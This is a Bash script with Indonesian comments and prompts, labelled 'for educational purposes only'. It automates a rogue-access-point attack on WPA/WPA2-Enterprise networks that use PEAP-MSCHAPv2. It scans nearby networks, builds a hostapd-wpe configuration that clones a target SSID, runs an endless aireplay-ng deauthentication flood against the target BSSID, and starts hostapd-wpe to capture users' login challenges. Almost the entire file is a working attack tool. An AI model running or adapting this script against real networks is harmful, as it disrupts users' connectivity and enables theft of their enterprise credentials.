#!/bin/bash
#--------------------------------------------------------------------------------------
#
# Script Bash sederhana untuk simulasi serangan pada Wi-Fi WPA/WPA2-Enterprise (802.1X)
# yang menggunakan metode EAP-PEAP (PEAP-MSCHAPv2)
#
# For educational purposes only!
#
#--------------------------------------------------------------------------------------
# Dibuat oleh: Rofi (Fixploit03)

function cek_root(){
        if [[ $EUID -ne 0 ]]; then
                echo "[-] Script ini harus dijalankan sebagai root!"
                exit 1
        fi
}

function banner(){
        clear
        echo "+-----------------------------------------------------------------------------------------+"
        echo "|                                                                                         |"
        echo "|  Script Bash sederhana untuk simulasi serangan pada Wi-Fi WPA/WPA2-Enterprise (802.1X)  |"
        echo "|  yang menggunakan metode EAP-PEAP (PEAP-MSCHAPv2)                                       |"
        echo "|                                                                                         |"
        echo "+-----------------------------------------------------------------------------------------+"
        echo ""
}

function seting_interface(){
        # Seting interface untuk Rogue AP
        while true; do
                read -p "[?] Nama interface untuk Rogue AP (contoh: wlan0): " interface_rogue
                if [[ -z "${interface_rogue}" ]]; then
                        echo "[-] Nama interface untuk Rogue AP tidak boleh kosong."
                        continue
                else
                        if iw dev | grep -wq "${interface_rogue}"; then
                                break
                        else
                                echo "[-] Interface ${interface_rogue} tidak ditemukan."
                                continue
                        fi
                fi
        done

        # Seting interface untuk serangan deauthentication
        while true; do
                read -p "[?] Nama interface untuk serangan deauthentication (contoh: wlan1): " interface_deauth
                if [[ -z "${interface_deauth}" ]]; then
                        echo "[-] Nama interface untuk serangan deauthentication tidak boleh kosong."
                        continue
                else
                        if iw dev | grep -wq "${interface_deauth}"; then
                                break
                        else
                                echo "[-] Interface ${interface_deauth} tidak ditemukan."
                                continue
                        fi
                fi
        done
}

function seting_mode_monitor(){
        # Mematikan proses
        echo "[*] Mematikan proses yang dapat mengganggu mode monitor..."
        if airmon-ng check kill; then
                echo "[+] Berhasil mematikan proses yang dapat mengganggu mode monitor."
        else
                echo "[-] Gagal mematikan proses yang dapat mengganggu mode monitor."
                exit 1
        fi

        # Mengaktifkan mode monitor
        echo "[*] Mengaktifkan mode monitor pada interface '${interface_deauth}'..."
        if airmon-ng start "${interface_deauth}"; then
                echo -e "\n[+] Berhasil mengaktifkan monitor pada interface '${interface_deauth}'."
        else
                echo -e "\n[-] Gagal mengaktifkan monitor pada interface '${interface_deauth}'."
                exit 1
        fi
}

function scan_target(){
        echo "[*] Melakukan scanning terhadap jaringan Wi-Fi WPA/WPA2-Enterprise yang ada di sekitar..."
        echo "[*] Tekan CTRL+C untuk menghentikan proses scanning."
        sleep 5
        airodump-ng "${interface_deauth}"
}

function seting_konfigurasi_file(){
        echo ""

        # Input ssid target
        while true; do
                read -p "[?] SSID: " ssid
                if [[ -z "${ssid}" ]]; then
                        echo "[-] SSID tidak boleh kosong."
                        continue
                else
                        break
                fi
        done

        # Input bssid target
        while true; do
                read -p "[?] BSSID: " bssid
                if [[ -z "${bssid}" ]]; then
                        echo "[-] BSSID tidak boleh kosong."
                        continue
                else
                        if [[ "${bssid}" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                                break
                        else
                                echo "[-] BSSID tidak valid."
                                continue
                        fi
                fi
        done

        # Input channel target
        while true; do
                read -p "[?] Channel: " channel
                if [[ -z "${channel}" ]]; then
                        echo "[-] Channel tidak boleh kosong."
                        continue
                else
                        if [[ "${channel}" =~ ^[0-9]+$ ]]; then
                                break
                        else
                                echo "[-] Channel harus berupa angka."
                                continue
                        fi
                fi
        done

        # Input private key server
        while true; do
                read -e -p "[?] Private key server: " private_key
                private_key=$(echo "${private_key}" | tr -d "'\"")
                if [[ -z "${private_key}" ]]; then
                        echo "[-] Private key server tidak boleh kosong."
                        continue
                else
                        if [[ -f "${private_key}" ]]; then
                                break
                        else
                                echo "[-] Private key server tidak ditemukan."
                                continue
                        fi
                fi
        done

        # Input sertifikat server
        while true; do
                read -e -p "[?] Sertifikat server (Self-Signed): " sertifikat_server
                sertifikat_server=$(echo "${sertifikat_server}" | tr -d "'\"")
                if [[ -z "${sertifikat_server}" ]]; then
                        echo "[-] Sertifikat server (Self-Signed) tidak boleh kosong."
                        continue
                else
                        if [[ -f "${sertifikat_server}" ]]; then
                                break
                        else
                                echo "[-] Sertifikat server (Self-Signed) tidak ditemukan."
                                continue
                        fi
                fi
        done

        # Ganti channel interface sesuai dengan channel target
        echo "[*] Mengganti channel interface '${interface_deauth}' sesuai dengan channel target..."
        if airmon-ng start "${interface_deauth}" "${channel}"; then
                echo -e "\n[+] Berhasil mengganti channel interface '${interface_deauth}' sesuai dengan channel target."
        else
                echo -e "\n[-] Gagal mengganti channel interface '${interface_deauth}' sesuai dengan channel target."
                exit 1
        fi
}

function bikin_file_konfigurasi(){
        output_file="hostapd-wpe.conf"
        echo "[*] Membuat file konfigurasi '${output_file}'..."

        cat << EOF > "${output_file}"
interface=${interface_rogue}
driver=nl80211
ssid=${ssid}
hw_mode=g
channel=${channel}
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
rsn_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
private_key=${private_key}
server_cert=${sertifikat_server}
dh_file=/etc/hostapd-wpe/certs/dh
EOF
        echo "[+] Berhasil membuat file konfigurasi '${output_file}'."
}

function run(){
        echo "[*] Menjalankan serangan..."
        echo "[*] Untuk menghentikannya ketikkan perintah 'sudo killall -9 xterm'."
        sleep 5

        # Running Deauth Attack
        echo "[*] Menjalankan serangan deauthentication menggunakan aireplay-ng..."
        xterm -T "Deauth Attack (aireplay-ng)" -geometry 90x30-0+0 -e "aireplay-ng -0 0 -a ${bssid} ${interface_deauth}" &

        # Running Rogue AP
        echo "[*] Menjalankan Rogue AP menggunakan hostapd-wpe..."
        xterm -T "Rogue AP (hostapd-wpe)" -geometry 90x30+0+0 -e "hostapd-wpe ${output_file}" &
}

# Panggil semua fungsi
cek_root
banner
seting_interface
seting_mode_monitor
scan_target
seting_konfigurasi_file
bikin_file_konfigurasi
run
